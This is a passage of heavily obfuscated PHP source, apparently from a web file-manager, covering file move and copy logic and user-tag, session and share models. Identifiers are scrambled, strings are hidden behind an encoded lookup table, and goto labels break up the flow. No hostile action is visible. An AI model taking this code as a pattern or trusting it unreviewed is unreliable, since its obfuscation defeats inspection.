($ßµ­¼à¬[$ñ±İËø[470]] == $®›íÆø && $Æ›î—âÎ != $ßµ­¼à¬[$ñ±İËø[32]]) { $û²“¦âÊ = $this->fileNameExist($®›íÆø, $Æ›î—âÎ); if ($û²“¦âÊ && $ßµ­¼à¬[$ñ±İËø[448]] == $ñ±İËø[208]) { $ÂËÏ·Ô³ = $this->sourceInfo($û²“¦âÊ); $»´ÁÉœ§ = $this->fileHistory($ÂËÏ·Ô³, $ßµ­¼à¬[$ñ±İËø[506]], $ßµ­¼à¬[$ñ±İËø[76]]); if (!$»´ÁÉœ§) { Model($ñ±İËø[509])->remove($ßµ­¼à¬[$ñ±İËø[506]]); } $this->removeNow($º•£Á…ê, !1); $this->folderSizeReset($®›íÆø); Hook::trigger($ñ±İËø[625], $À½®µÔ); return $û²“¦âÊ; } } $èô¡™úÓ = $Æ›î—âÎ ? $Æ›î—âÎ : $ßµ­¼à¬[$ñ±İËø[32]]; $this->lockMoveStart($º•£Á…ê); $this->lockWriteStart($®›íÆø, $èô¡™úÓ); $ŞºŞŞ­ = array($ñ±İËø[595] => array(), $ñ±İËø[626] => !1); $this->clearShare($º•£Á…ê, $®›íÆø); $ğ ñƒ¦ò = $this->fileNameExistCache($®›íÆø, $ßµ­¼à¬[$ñ±İËø[32]]); $ñœíşê = $this->_move($º•£Á…ê, $®›íÆø, $äÍÕò…ã, $ŞºŞŞ­, $Æ›î—âÎ); $this->sourceCacheClear(); if ($ßµ­¼à¬[$ñ±İËø[448]] == $ñ±İËø[88] && $ğ ñƒ¦ò) { $this->folderSizeResetChildren($ñœíşê); } Model($ñ±İËø[210])->linkAdd($ŞºŞŞ­[$ñ±İËø[595]]); if ($ğ ñƒ¦ò && $ŞºŞŞ­[$ñ±İËø[626]]) { $this->removeNow($º•£Á…ê, !1); } $this->lockMoveEnd($º•£Á…ê); $this->lockWriteEnd($®›íÆø, $èô¡™úÓ); $this->folderSizeReset($ßµ­¼à¬[$ñ±İËø[470]]); $this->folderSizeReset($®›íÆø); $şÛÆñÉ = array($ßµ­¼à¬[$ñ±İËø[470]], $®›íÆø); if ($ßµ­¼à¬[$ñ±İËø[448]] == $ñ±İËø[88]) { $şÛÆñÉ[] = $º•£Á…ê; } $this->updateModifyTime($şÛÆñÉ); Model($ñ±İËø[599])->eventMove($º•£Á…ê, $ßµ­¼à¬[$ñ±İËø[470]], $®›íÆø); Hook::trigger($ñ±İËø[625], $À½®µÔ); return $ñœíşê; } private function _move($æÆÖùè, $—´¡ªšö, $½¯ç““, &$«ö“…©, $ôÄ­ÒÏÁ = '') { $Ûù…œûª =& $_SERVER[”ú…±Ú¥]; $È¥ã½‘â = $this->sourceInfo($æÆÖùè); $‰¸¸ò€ = $È¥ã½‘â[$Ûù…œûª[448]] == $Ûù…œûª[88]; $•ÃÄ„Äš = $ôÄ­ÒÏÁ ? $ôÄ­ÒÏÁ : $È¥ã½‘â[$Ûù…œûª[32]]; $ñ¹´Òú = $this->fileNameExistCache($—´¡ªšö, $•ÃÄ„Äš); $this->lockMoveStart($æÆÖùè); $this->lockWriteStart($—´¡ªšö, $•ÃÄ„Äš); if (!$ñ¹´Òú) { return $this->_moveForce($æÆÖùè, $—´¡ªšö, $•ÃÄ„Äš); } $«–ñú Ù = $ñ¹´Òú; $´÷­Ğ—Ì = !1; if ($‰¸¸ò€) { if ($½¯ç““ == REPEAT_RENAME_FOLDER) { $•ÃÄ„Äš = $this->fileNameAuto($—´¡ªšö, $•ÃÄ„Äš, $½¯ç““, $‰¸¸ò€); $«–ñú Ù = $this->_moveForce($æÆÖùè, $—´¡ªšö, $•ÃÄ„Äš); } else { if ($½¯ç““ == REPEAT_RENAME_FOLDER) { $½¯ç““ = REPEAT_RENAME; } $…ÕÊ§“„ = $this->_childrenListSelect($æÆÖùè); foreach ($…ÕÊ§“„ as $‘çİ²“) { $this->_move($‘çİ²“[$Ûù…œûª[440]], $ñ¹´Òú, $½¯ç““, $«ö“…©); } $´÷­Ğ—Ì = !0; } } else { if ($½¯ç““ == REPEAT_SKIP) { $´÷­Ğ—Ì = !0; } else { if ($½¯ç““ == REPEAT_RENAME || $½¯ç““ == REPEAT_RENAME_FOLDER) { $•ÃÄ„Äš = $this->fileNameAuto($—´¡ªšö, $•ÃÄ„Äš, $½¯ç““, $‰¸¸ò€); $«–ñú Ù = $this->_moveForce($æÆÖùè, $—´¡ªšö, $•ÃÄ„Äš); } else { if ($½¯ç““ == REPEAT_REPLACE) { $·ÁÓ™Ñ = $this->sourceInfoCache($ñ¹´Òú); $ô¾“å–Ï = $this->fileHistory($·ÁÓ™Ñ, $È¥ã½‘â[$Ûù…œûª[506]], $È¥ã½‘â[$Ûù…œûª[76]]); $´÷­Ğ—Ì = !0; if ($ô¾“å–Ï) { $«ö“…©[$Ûù…œûª[595]][] = $È¥ã½‘â[$Ûù…œûª[506]]; } } } } } if ($´÷­Ğ—Ì && !$«ö“…©[$Ûù…œûª[626]]) { $«ö“…©[$Ûù…œûª[626]] = !0; } return $«–ñú Ù; } private function _moveForce($Ç¸¸ªö¡, $¨ÉÕ¼¡¼, $óÛ¥¢Ù) { $šÆôéŒ˜ =& $_SERVER[”ú…±Ú¥]; $ñ âéæ = $this->sourceInfo($Ç¸¸ªö¡); $òÍã–°÷ = $this->sourceInfo($¨ÉÕ¼¡¼); $æ§Ëª‡ = $ñ âéæ[$šÆôéŒ˜[448]] == $šÆôéŒ˜[88]; $åŒÑôçÕ = array($šÆôéŒ˜[439] => $òÍã–°÷[$šÆôéŒ˜[440]], $šÆôéŒ˜[618] => $òÍã–°÷[$šÆôéŒ˜[549]] . $òÍã–°÷[$šÆôéŒ˜[440]] . $šÆôéŒ˜[50], $šÆôéŒ˜[614] => $òÍã–°÷[$šÆôéŒ˜[449]], $šÆôéŒ˜[615] => $òÍã–°÷[$šÆôéŒ˜[534]], $šÆôéŒ˜[617] => USER_ID, $šÆôéŒ˜[458] => $óÛ¥¢Ù); $äë«¦éÉ = $ñ âéæ[$šÆôéŒ˜[449]] == SourceModel::TYPE_GROUP && $òÍã–°÷[$šÆôéŒ˜[449]] == SourceModel::TYPE_GROUP && $ñ âéæ[$šÆôéŒ˜[534]] == $òÍã–°÷[$šÆôéŒ˜[534]]; if (!$äë«¦éÉ && $this->moveClearAuth) { Model($šÆôéŒ˜[531])->authClear($Ç¸¸ªö¡); } $ûÊå¿¼Û = $ñ âéæ[$šÆôéŒ˜[469]] == $šÆôéŒ˜[88] && $òÍã–°÷[$šÆôéŒ˜[469]] != $šÆôéŒ˜[88]; if ($ûÊå¿¼Û) { $åŒÑôçÕ[$šÆôéŒ˜[468]] = 0; } if ($æ§Ëª‡) { $ùÙÕ‘áß = array($šÆôéŒ˜[618] => array($šÆôéŒ˜[578], $ñ âéæ[$šÆôéŒ˜[549]] . $ñ âéæ[$šÆôéŒ˜[440]] . $šÆôéŒ˜[579])); $çï¶’æ¡ = $ñ âéæ[$šÆôéŒ˜[549]] . $ñ âéæ[$šÆôéŒ˜[440]] . $šÆôéŒ˜[50]; $©÷ÔÌÓÌ = $òÍã–°÷[$šÆôéŒ˜[549]] . $òÍã–°÷[$šÆôéŒ˜[440]] . $šÆôéŒ˜[50] . $ñ âéæ[$šÆôéŒ˜[440]] . $šÆôéŒ˜[50]; $‡‚‚‹“ = array($šÆôéŒ˜[618] => array($šÆôéŒ˜[627], "\162\x65\x70\x6c\141\x63\145\50\x70\141\162\145\156\x74\x4c\x65\x76\145\154\54\47{$çï¶’æ¡}\x27\x2c\x27{$©÷ÔÌÓÌ}\x27\51"), $šÆôéŒ˜[614] => $òÍã–°÷[$šÆôéŒ˜[449]], $šÆôéŒ˜[615] => $òÍã–°÷[$šÆôéŒ˜[534]]); if ($ûÊå¿¼Û) { $‡‚‚‹“[$šÆôéŒ˜[468]] = 0; } $this->where($ùÙÕ‘áß)->data($‡‚‚‹“)->save(); } $this->where(array($šÆôéŒ˜[455] => $Ç¸¸ªö¡))->data($åŒÑôçÕ)->save(); return $Ç¸¸ªö¡; } private function clearShare($¸çßÕ, $Ğı±ÔüÙ) { $ëƒ¥ô‹Ì =& $_SERVER[”ú…±Ú¥]; $™ãóü× = $this->sourceInfo($¸çßÕ); $êêÔÔ”Í = $this->sourceInfo($Ğı±ÔüÙ); if ($™ãóü×[$ëƒ¥ô‹Ì[534]] == $êêÔÔ”Í[$ëƒ¥ô‹Ì[534]] && $™ãóü×[$ëƒ¥ô‹Ì[449]] == $ëƒ¥ô‹Ì[628]) { return; } $Ü†´ÚùÇ = array($ëƒ¥ô‹Ì[549] => array($ëƒ¥ô‹Ì[578], $™ãóü×[$ëƒ¥ô‹Ì[549]] . $¸çßÕ . $ëƒ¥ô‹Ì[579])); $ïğ‹×ë£ = $this->field($ëƒ¥ô‹Ì[455])->where($Ü†´ÚùÇ)->getField($ëƒ¥ô‹Ì[440], !0); if (!$ïğ‹×ë£) { return; } $Ü†´ÚùÇ = array($ëƒ¥ô‹Ì[440] => array($ëƒ¥ô‹Ì[7], $ïğ‹×ë£), $ëƒ¥ô‹Ì[629] => 1); $—ÂÅÀàİ = Model($ëƒ¥ô‹Ì[630])->field($ëƒ¥ô‹Ì[631])->where($Ü†´ÚùÇ)->select(); if (!$—ÂÅÀàİ) { return; } $—ÂÅÀàİ = array_to_keyvalue($—ÂÅÀàİ, $ëƒ¥ô‹Ì[12], $ëƒ¥ô‹Ì[631]); $Ü†´ÚùÇ = array($ëƒ¥ô‹Ì[631] => array($ëƒ¥ô‹Ì[7], $—ÂÅÀàİ)); Model($ëƒ¥ô‹Ì[630])->where($Ü†´ÚùÇ)->save(array($ëƒ¥ô‹Ì[629] => 0)); Model($ëƒ¥ô‹Ì[632])->where($Ü†´ÚùÇ)->delete(); } public function copyFolderFromIO($¨–¢ÏŸ, $Ğ…Èò¯æ, $ÀËÔØ¸Ó, $†Å¶¶ºÚ, $ıˆÊÀäÖ, $ÈÜÌËÃ¶ = false) { $ßÈ­ı¥ª =& $_SERVER[”ú…±Ú¥]; $Îèã¢Ÿµ = array($ßÈ­ı¥ª[596] => array(), $ßÈ­ı¥ª[597] => array(), $ßÈ­ı¥ª[595] => array(), $ßÈ­ı¥ª[633] => array()); $ïÑ¿ÑÛü = $ÈÜÌËÃ¶ ? $ÈÜÌËÃ¶ : $¨–¢ÏŸ->pathThis($Ğ…Èò¯æ); $“¨É’™„ = $this->fileNameExist($ÀËÔØ¸Ó, $ïÑ¿ÑÛü); $·¨øˆÍü = $this->mkdir($ÀËÔØ¸Ó, $ïÑ¿ÑÛü, $†Å¶¶ºÚ); if (!$“¨É’™„ || $†Å¶¶ºÚ == REPEAT_RENAME_FOLDER) { $†Å¶¶ºÚ = !1; } if ($“¨É’™„) { $this->_childrenAllMake($“¨É’™„); } Hook::trigger($ßÈ­ı¥ª[634]); $this->_copyChildTo($¨–¢ÏŸ, $Ğ…Èò¯æ, $·¨øˆÍü, $†Å¶¶ºÚ, $Îèã¢Ÿµ, $ıˆÊÀäÖ); Hook::trigger($ßÈ­ı¥ª[635]); if ($·¨øˆÍü) { $this->folderSizeResetChildren($·¨øˆÍü); } $this->_childrenListClear(); Model($ßÈ­ı¥ª[598])->addAll($Îèã¢Ÿµ[$ßÈ­ı¥ª[596]], array(), !0); Model($ßÈ­ı¥ª[599])->eventCopy($·¨øˆÍü); $this->saveAll($Îèã¢Ÿµ[$ßÈ­ı¥ª[597]]); Model($ßÈ­ı¥ª[509])->linkAdd($Îèã¢Ÿµ[$ßÈ­ı¥ª[595]]); Model($ßÈ­ı¥ª[509])->remove($Îèã¢Ÿµ[$ßÈ­ı¥ª[633]]); $this->folderSizeReset($ÀËÔØ¸Ó); $this->updateModifyTime($ÀËÔØ¸Ó); return $·¨øˆÍü; } private function _copyChildTo($ç÷¤ÔÈå, $ŒªÙè˜Ô, $ƒºööõ…, $ŞÆ¶•–, &$ëıí³¨, $¶ç½»æå) { $ó¸›¶Ú‡ =& $_SERVER[”ú…±Ú¥]; $¤íù»È = $this->sourceInfoCache($ƒºööõ…); $«è÷ôÆÔ = $ç÷¤ÔÈå->listPath($ŒªÙè˜Ô); $«è÷ôÆÔ = $«è÷ôÆÔ ? $«è÷ôÆÔ : array($ó¸›¶Ú‡[83] => array(), $ó¸›¶Ú‡[82] => array()); $ğ»ëä¼ì = array_merge($«è÷ôÆÔ[$ó¸›¶Ú‡[83]], $«è÷ôÆÔ[$ó¸›¶Ú‡[82]]); $ªñº¸¡È = $this->_addFiles($ç÷¤ÔÈå, $«è÷ôÆÔ[$ó¸›¶Ú‡[83]], $¶ç½»æå); $Š­ÜÂ‰é = array(); foreach ($ğ»ëä¼ì as &$Ûüëçà) { if (isset($ªñº¸¡È[$Ûüëçà[$ó¸›¶Ú‡[32]]])) { $Ûüëçà = $ªñº¸¡È[$Ûüëçà[$ó¸›¶Ú‡[32]]]; } $Ûüëçà[$ó¸›¶Ú‡[448]] = $Ûüëçà[$ó¸›¶Ú‡[33]] == $ó¸›¶Ú‡[75]; $Ûüëçà[$ó¸›¶Ú‡[450]] = substr(_get($Ûüëçà, $ó¸›¶Ú‡[174], $ó¸›¶Ú‡[12]), 0, 10); $Ûüëçà[$ó¸›¶Ú‡[76]] = _get($Ûüëçà, $ó¸›¶Ú‡[76], 0); $Ûüëçà[$ó¸›¶Ú‡[506]] = _get($Ûüëçà, $ó¸›¶Ú‡[506], 0); if (!isset($Ûüëçà[$ó¸›¶Ú‡[636]]) && $Ûüëçà[$ó¸›¶Ú‡[506]]) { $ëıí³¨[$ó¸›¶Ú‡[633]][] = $Ûüëçà[$ó¸›¶Ú‡[506]]; } if ($ŞÆ¶•–) { $¼½ºİ¸í = $this->fileNameExistCache($ƒºööõ…, $Ûüëçà[$ó¸›¶Ú‡[32]]); if ($¼½ºİ¸í) { if ($Ûüëçà[$ó¸›¶Ú‡[448]] || $ŞÆ¶•– == REPEAT_SKIP) { continue; } if ($ŞÆ¶•– == REPEAT_REPLACE) { $ĞÕ±Ú·ª = $this->sourceInfoCache($¼½ºİ¸í); $¥â„ıêä = $this->fileHistory($ĞÕ±Ú·ª, $Ûüëçà[$ó¸›¶Ú‡[506]], $Ûüëçà[$ó¸›¶Ú‡[76]]); if ($¥â„ıêä) { $ëıí³¨[$ó¸›¶Ú‡[595]][] = $Ûüëçà[$ó¸›¶Ú‡[506]]; } continue; } else { if ($ŞÆ¶•– == REPEAT_RENAME) { $Ûüëçà[$ó¸›¶Ú‡[32]] = $this->fileNameAutoCache($ƒºööõ…, $Ûüëçà[$ó¸›¶Ú‡[32]], $ŞÆ¶•–, !1); } } } } if (!$Ûüëçà[$ó¸›¶Ú‡[448]] && $Ûüëçà[$ó¸›¶Ú‡[506]] == 0) { continue; } if (!$Ûüëçà[$ó¸›¶Ú‡[448]] && $Ûüëçà[$ó¸›¶Ú‡[506]]) { $ëıí³¨[$ó¸›¶Ú‡[595]][] = $Ûüëçà[$ó¸›¶Ú‡[506]]; } $Š­ÜÂ‰é[] = $this->_makeItemData($Ûüëçà, $¤íù»È, $Ûüëçà[$ó¸›¶Ú‡[32]]); } unset($Ûüëçà); if (!empty($Š­ÜÂ‰é)) { $this->addAll($Š­ÜÂ‰é); $this->_childrenListSelect($ƒºööõ…); } $Â£…‹üè = $this->_childrenList($ƒºööõ…); $Â£…‹üè = array_to_keyvalue($Â£…‹üè, $ó¸›¶Ú‡[32]); foreach ($ğ»ëä¼ì as $Ûüëçà) { $ĞÕ±Ú·ª = $Â£…‹üè[$Ûüëçà[$ó¸›¶Ú‡[32]]]; $³¼š—ùÂ = $ĞÕ±Ú·ª[$ó¸›¶Ú‡[440]]; $this->_copyApplyMeta($ĞÕ±Ú·ª, $ëıí³¨); if ($Ûüëçà[$ó¸›¶Ú‡[33]] == $ó¸›¶Ú‡[75]) { $Ûüëçà[$ó¸›¶Ú‡[84]] = $ç÷¤ÔÈå->getPathInner($Ûüëçà[$ó¸›¶Ú‡[84]]); $this->_copyChildTo($ç÷¤ÔÈå, $Ûüëçà[$ó¸›¶Ú‡[84]], $³¼š—ùÂ, $ŞÆ¶•–, $ëıí³¨, $¶ç½»æå); } } } private function _addFiles($Û©¦²–·, $ó©”øæØ, $Ï˜‚„Ò‚) { $ÕîáæºÖ =& $_SERVER[”ú…±Ú¥]; if (!$ó©”øæØ || count($ó©”øæØ) == 0) { return array(); } $‡é¿ˆ®û = array(); foreach ($ó©”øæØ as &$´éÊ‚û–) { Hook::trigger($ÕîáæºÖ[637], $´éÊ‚û–); $´éÊ‚û–[$ÕîáæºÖ[84]] = $Û©¦²–·->getPathInner($´éÊ‚û–[$ÕîáæºÖ[84]]); $Àã½³ìÏ = $Û©¦²–·->hashSimple($´éÊ‚û–[$ÕîáæºÖ[84]]); $î…œõ€Š = $Û©¦²–·->hashMd5($´éÊ‚û–[$ÕîáæºÖ[84]]); if (strlen($î…œõ€Š) > 10 && !isset($‡é¿ˆ®û[$î…œõ€Š])) { $‡é¿ˆ®û[$î…œõ€Š] = array(); } $´éÊ‚û–[$ÕîáæºÖ[177]] = $Àã½³ìÏ; $´éÊ‚û–[$ÕîáæºÖ[176]] = $î…œõ€Š; $‡é¿ˆ®û[$î…œõ€Š][] =& $´éÊ‚û–; if (count($‡é¿ˆ®û[$î…œõ€Š]) > 1) { $´éÊ‚û–[$ÕîáæºÖ[636]] = !0; } Hook::trigger($ÕîáæºÖ[638], $´éÊ‚û–); } unset($´éÊ‚û–); $»œŞû©È = array($ÕîáæºÖ[176] => array($ÕîáæºÖ[7], array_keys($‡é¿ˆ®û))); $³’ŞÛˆ = Model($ÕîáæºÖ[639]); $ùùÔšÛ = $³’ŞÛˆ->where($»œŞû©È)->select(); $ùùÔšÛ = $ùùÔšÛ ? $ùùÔšÛ : array(); foreach ($ùùÔšÛ as $–éÅ¢ûÕ) { if (!isset($‡é¿ˆ®û[$–éÅ¢ûÕ[$ÕîáæºÖ[176]]])) { continue; } $™Éºù… = $‡é¿ˆ®û[$–éÅ¢ûÕ[$ÕîáæºÖ[176]]]; foreach ($™Éºù… as &$´éÊ‚û–) { $´éÊ‚û–[$ÕîáæºÖ[506]] = $–éÅ¢ûÕ[$ÕîáæºÖ[506]]; $´éÊ‚û–[$ÕîáæºÖ[636]] = !0; } unset($´éÊ‚û–); } $©À¾Ï© = array(); foreach ($ó©”øæØ as $ĞêĞìÍ‰) { Hook::trigger($ÕîáæºÖ[640], $ĞêĞìÍ‰); if (isset($ĞêĞìÍ‰[$ÕîáæºÖ[636]]) && $ĞêĞìÍ‰[$ÕîáæºÖ[636]]) { Hook::trigger($ÕîáæºÖ[641], $ĞêĞìÍ‰); continue; } $¡æúã¤ = $Û©¦²–·->getPathInner($ĞêĞìÍ‰[$ÕîáæºÖ[84]]); $îéà½Îş = $³’ŞÛˆ->addFileMake($¡æúã¤, $ĞêĞìÍ‰[$ÕîáæºÖ[76]], $ĞêĞìÍ‰[$ÕîáæºÖ[177]], $ĞêĞìÍ‰[$ÕîáæºÖ[176]], $ĞêĞìÍ‰[$ÕîáæºÖ[32]], $Ï˜‚„Ò‚); Hook::trigger($ÕîáæºÖ[641], $ĞêĞìÍ‰); if (!is_array($îéà½Îş)) { continue; } $©À¾Ï©[] = $îéà½Îş; } $³’ŞÛˆ->addAll($©À¾Ï©); $»œŞû©È = array($ÕîáæºÖ[176] => array($ÕîáæºÖ[7], array_keys($‡é¿ˆ®û))); $ùùÔšÛ = $³’ŞÛˆ->where($»œŞû©È)->select(); $ùùÔšÛ = $ùùÔšÛ ? $ùùÔšÛ : array(); foreach ($ùùÔšÛ as $–éÅ¢ûÕ) { if (!isset($‡é¿ˆ®û[$–éÅ¢ûÕ[$ÕîáæºÖ[176]]])) { continue; } $ïËÅ¤ÓØ =& $‡é¿ˆ®û[$–éÅ¢ûÕ[$ÕîáæºÖ[176]]]; foreach ($ïËÅ¤ÓØ as &$´éÊ‚û–) { $´éÊ‚û–[$ÕîáæºÖ[506]] = $–éÅ¢ûÕ[$ÕîáæºÖ[506]]; } unset($´éÊ‚û–); } $ì€½“ÕÑ = array(); foreach ($ó©”øæØ as $Íé•…œç) { $ì€½“ÕÑ[$Íé•…œç[$ÕîáæºÖ[32]]] = $Íé•…œç; } return $ì€½“ÕÑ; } } define($_SERVER[”ú…±Ú¥][642], $_SERVER[”ú…±Ú¥][643]); $vfcoribudz = $_SERVER[”ú…±Ú¥][644]; goto aö³¶©«ñÄ; B÷‡½ŒÍË…: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\56\164\x61\147\x4c\x69\163\x74"; public $modelType = "\125\163\x65\x72\x4f\x70\164\x69\157\x6e"; public $field = array("\x6e\x61\x6d\x65", "\163\x74\171\154\145", "\163\x6f\162\164"); public function listData($¹Ù¡§Æ° = false, $ÙÚİÛê¤ = "\x73\157\162\164", $ßÚ¯çÈä = false) { return parent::listData($¹Ù¡§Æ°, $ÙÚİÛê¤, $ßÚ¯çÈä); } public function remove($íË‘†ÆÀ) { return parent::remove($íË‘†ÆÀ); } public function add($üµÇÖ  , $ÖƒÂÀºÏ = "\154\141\x62\x65\x6c\55\147\162\x65\171\x2d\x6e\x6f\x72\x6d\141\x6c") { $èŞçôø  =& $_SERVER[”ú…±Ú¥]; if ($this->findByName($üµÇÖ  )) { return !1; } $¹üş›— = array($èŞçôø [458] => $üµÇÖ  , $èŞçôø [522] => $ÖƒÂÀºÏ, $èŞçôø [1865] => $this->getSort($èŞçôø [296]) + 1); return parent::insert($¹üş›—); } public function update($“®ßŞ§ù, $äÈ²¥æ) { $÷ËÔæÚå =& $_SERVER[”ú…±Ú¥]; $ù«ğµ = $this->listData($“®ßŞ§ù); $“¨Š©´ö = $this->findByName($äÈ²¥æ[$÷ËÔæÚå[32]]); if (!$ù«ğµ || $“¨Š©´ö && $“¨Š©´ö[$÷ËÔæÚå[437]] != $ù«ğµ[$÷ËÔæÚå[437]]) { return !1; } return parent::update($“®ßŞ§ù, $äÈ²¥æ); } public function moveTop($ªıì’â) { $ğĞ¦ğ® =& $_SERVER[”ú…±Ú¥]; $Â‰êçÚ¶ = parent::listData(); $Ú®©µáà = $this->getSort($ğĞ¦ğ®[295]); foreach ($Â‰êçÚ¶ as &$«˜°õƒ§) { if ($«˜°õƒ§[$ğĞ¦ğ®[437]] == $ªıì’â) { $«˜°õƒ§[$ğĞ¦ğ®[1885]] = $Ú®©µáà; continue; } $«˜°õƒ§[$ğĞ¦ğ®[1885]] += 1; } unset($«˜°õƒ§); return parent::resetData($Â‰êçÚ¶); } public function moveBottom($úî•´íÏ) { $°ñ‘—§Ş =& $_SERVER[”ú…±Ú¥]; $¶‘®òõØ = $this->getSort($°ñ‘—§Ş[296]) + 1; return parent::update($úî•´íÏ, array($°ñ‘—§Ş[1885] => $¶‘®òõØ)); } public function resetSort($Ñ½¡ Ò) { $§²§®Ÿ =& $_SERVER[”ú…±Ú¥]; $ó¿×Ä¼õ = array(); $Ñ½¡ Ò = is_array($Ñ½¡ Ò) ? $Ñ½¡ Ò : array(); for ($ÚÆå = 0; $ÚÆå < count($Ñ½¡ Ò); $ÚÆå++) { $ó¿×Ä¼õ[$Ñ½¡ Ò[$ÚÆå] . $§²§®Ÿ[12]] = $ÚÆå + 1; } $ï“Ü ¼ò = parent::listData(); foreach ($ï“Ü ¼ò as &$ŞöèÎ¿Ü) { $øãé§²œ = $ó¿×Ä¼õ[$ŞöèÎ¿Ü[$§²§®Ÿ[437]]]; $ŞöèÎ¿Ü[$§²§®Ÿ[1885]] = $øãé§²œ ? $øãé§²œ : $ŞöèÎ¿Ü[$§²§®Ÿ[1885]]; } unset($ŞöèÎ¿Ü); return parent::resetData($ï“Ü ¼ò); } private function getSort($Å³‡¢—) { $˜ÂÂ£çĞ =& $_SERVER[”ú…±Ú¥]; $¬›á„³× = parent::listData(); $ó´—‚Æ… = array_to_keyvalue($¬›á„³×, $˜ÂÂ£çĞ[12], $˜ÂÂ£çĞ[1885]); if (!$ó´—‚Æ…) { $ó´—‚Æ… = array(0); } $ï¯ÁòçÛ = $Å³‡¢— == $˜ÂÂ£çĞ[296] ? max($ó´—‚Æ…) : min($ó´—‚Æ…); return intval($ï¯ÁòçÛ); } } goto A²‘¬’ÊÜ„; FšÖÃ„Â®Ş: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\155\x5f\x73\145\163\x73\151\157\x6e"; public function get($—«õÉŞ¡) { $ ¯ñí =& $_SERVER[”ú…±Ú¥]; $Â•«š—× = $this->where(array($ ¯ñí[1996] => $—«õÉŞ¡))->find(); if (!is_array($Â•«š—×)) { return !1; } return $Â•«š—×[$ ¯ñí[786]]; } public function set($ŞÆåó¤­, $’œ¬üÂ, $¼óù´ô = 3600) { $„ï«Òµı =& $_SERVER[”ú…±Ú¥]; $‘»®¶Ö = array($„ï«Òµı[1996] => $ŞÆåó¤­, $„ï«Òµı[1900] => $’œ¬üÂ, $„ï«Òµı[1997] => $¼óù´ô + time()); if (Session::get($„ï«Òµı[1998])) { $‘»®¶Ö[$„ï«Òµı[1671]] = Session::get($„ï«Òµı[1998]); } else { $‘»®¶Ö[$„ï«Òµı[1671]] = 0; } if ($this->get($ŞÆåó¤­)) { return $this->where(array($„ï«Òµı[1996] => $ŞÆåó¤­))->save($‘»®¶Ö); } else { return $this->add($‘»®¶Ö, array(), !0); } } public function remove($ÈÓõø¿ì) { return $this->where(array($_SERVER[”ú…±Ú¥][1996] => $ÈÓõø¿ì))->delete(); } public function clearTimeout() { return $this->where($_SERVER[”ú…±Ú¥][1999] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\124\151\x6d\x65", "\164\x69\155\145", "\x69\156\163\x65\x72\164\x2c\165\x70\144\141\x74\145", "\x66\x75\156\143\x74\151\x6f\x6e"), array("\143\x72\145\x61\164\x65\x54\151\x6d\x65", "\x74\151\x6d\x65", "\x69\x6e\x73\x65\x72\x74", "\146\x75\x6e\x63\x74\x69\x6f\x6e"), array("\x6f\160\164\x69\157\x6e\163", '', "\x69\156\x73\145\162\x74\54\x75\160\x64\141\164\145\x2c\x73\145\x6c\x65\x63\x74", "\x6a\163\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($îõúœ›Ÿ) { $¾¿¥ĞÙÍ =& $_SERVER[”ú…±Ú¥]; $İöÕ‰† = isset($îõúœ›Ÿ[0]) ? $îõúœ›Ÿ[0] : !1; return array($¾¿¥ĞÙÍ[2000] => array(USER_ID, $¾¿¥ĞÙÍ[2001]), $¾¿¥ĞÙÍ[1941] => array($İöÕ‰†, $¾¿¥ĞÙÍ[2002])); } protected function listSimple() { $ÕÂ¥Ïı = array($_SERVER[”ú…±Ú¥][1671] => USER_ID); $Åï¼Ğ = $this->field($this->fieldList)->where($ÕÂ¥Ïı)->select(); return $Åï¼Ğ ? $Åï¼Ğ : array(); } protected function getInfo($À÷çŒŸ†, $åœ£ìµ = false) { $õŸšùøö =& $_SERVER[”ú…±Ú¥]; if ($åœ£ìµ) { return $this->_getShareInfo(array($õŸšùøö[631] => $À÷çŒŸ†)); } $ŒÔŒéË = $this->cacheFunctionGet($õŸšùøö[1943], $À÷çŒŸ†); return $ŒÔŒéË; } public function getInfoByHash($ıê‡‡¡æ) { return $this->_getShareInfo(array($_SERVER[”ú…±Ú¥][2003] => $ıê‡‡¡æ)); } public function getInfoByPath($ß²ß÷İÌ) { $ºÉ»Ú„‘ =& $_SERVER[”ú…±Ú¥]; $”‡Ùâ® = array($ºÉ»Ú„‘[1671] => USER_ID, $ºÉ»Ú„‘[440] => $ß²ß÷İÌ); return $this->_getShareInfo($”‡Ùâ®); } public function getInfoBySourcePath($”Ã†Ëê) { $ØíÒîÄ =& $_SERVER[”ú…±Ú¥]; $ˆ© ­ğÑ = array($ØíÒîÄ[1671] => USER_ID, $ØíÒîÄ[1204] => $”Ã†Ëê); return $this->_getShareInfo($ˆ© ­ğÑ); } private function _getShareInfo($–ô­°Á) { $Ó¬¼¸úğ =& $_SERVER[”ú…±Ú¥]; $ğ–ä˜Å­ = $this->where($–ô­°Á)->find(); if (!$ğ–ä˜Å­) { return !1; } $–ô­°Á = array($Ó¬¼¸úğ[631] => $ğ–ä˜Å­[$Ó¬¼¸úğ[631]]); $ŸâãˆÉ• = $Ó¬¼¸úğ[2004]; $áÆÇ¢ßÄ = Model($Ó¬¼¸úğ[632])->order($Ó¬¼¸úğ[437])->field($ŸâãˆÉ•)->where($–ô­°Á)->select(); if ($ğ–ä˜Å­[$Ó¬¼¸úğ[440]] == $Ó¬¼¸úğ[208]) { $ğ–ä˜Å­[$Ó¬¼¸úğ[87]] = IO::info($ğ–ä˜Å­[$Ó¬¼¸úğ[1204]]); } else { $ğ–ä˜Å­[$Ó¬¼¸úğ[87]] = Model($Ó¬¼¸úğ[1362])->pathInfo($ğ–ä˜Å­[$Ó¬¼¸úğ[440]]); } $ğ–ä˜Å­[$Ó¬¼¸úğ[2005]] = $áÆÇ¢ßÄ; return $ğ–ä˜Å­; } protected function getInfoAuth($Í×Ò´¨) { $‡á¥øı =& $_SERVER[”ú…±Ú¥]; $ªûê‚Ù = $this->getInfo($Í×Ò´¨); if ($ªûê‚Ù[$‡á¥øı[1671]] == USER_ID) { $ªûê‚Ù[$‡á¥øı[451]] = $ªûê‚Ù[$‡á¥øı[87]][$‡á¥øı[451]]; } else { $ªûê‚Ù[$‡á¥øı[451]] = Model($‡á¥øı[531])->authMake($ªûê‚Ù[$‡á¥øı[2005]]); } return $ªûê‚Ù; } protected function listData($ª­ëóå = null, $ãÇ•“ú = 300) { $Ä„ÛÂš  =& $_SERVER[”ú…±Ú¥]; $î€şÓ = array(array($Ä„ÛÂš 